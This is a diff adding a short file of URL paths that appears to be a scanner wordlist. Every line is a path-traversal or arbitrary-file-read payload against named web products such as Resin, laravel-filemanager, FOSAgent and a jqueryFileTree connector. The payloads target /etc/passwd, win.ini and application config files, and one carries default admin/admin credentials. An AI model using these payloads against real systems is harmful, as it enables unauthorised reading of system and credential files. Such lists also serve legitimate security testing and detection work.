@@ -1,0 +1,16 @@
+/services/getFile.cmd?userfile=config.xml
+/%20../web-inf/
+/fosagent/repl/download-file?basedir=4&filepath=..\..\Windows\win.ini
+/fosagent/repl/download-snapshot?name=..\..\..\..\..\..\..\Windows\win.ini
+/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/passwd%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=admin&PWD=admin&PIC_SIZE=0
+/file?valore=../../../../../windows/win.ini
+/download/C%3a%2fwindows%2fsystem.ini
+/_admin/imgdownload.php?filename=imgdownload.php
+/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
+/laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd
+/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
+/resin-doc/viewfile/?file=index.jsp
+/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
